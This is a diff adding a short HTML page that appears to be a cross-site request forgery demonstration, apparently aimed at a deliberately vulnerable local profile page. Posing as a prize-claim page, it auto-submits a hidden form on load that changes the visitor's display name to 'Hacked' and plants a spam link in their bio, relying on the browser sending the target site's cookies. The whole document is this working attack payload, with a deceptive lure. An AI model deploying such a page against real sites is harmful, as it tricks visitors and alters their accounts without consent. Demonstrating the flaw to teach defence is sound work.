@@ -1,0 +1,11 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>You've won a prize!</title>
+<h1>Claiming your prize...</h1>
+<!-- A form aimed at someone else's site, sent the moment the page loads.
+     The browser adds that site's cookies to the request by itself. -->
+<form id="prize" method="post" action="http://localhost:8000/naive-profile.php">
+    <input type="hidden" name="display_name" value="Hacked">
+    <input type="hidden" name="bio" value="Buy cheap watches at https://spam.example">
+</form>
+<script>document.getElementById('prize').submit();</script>
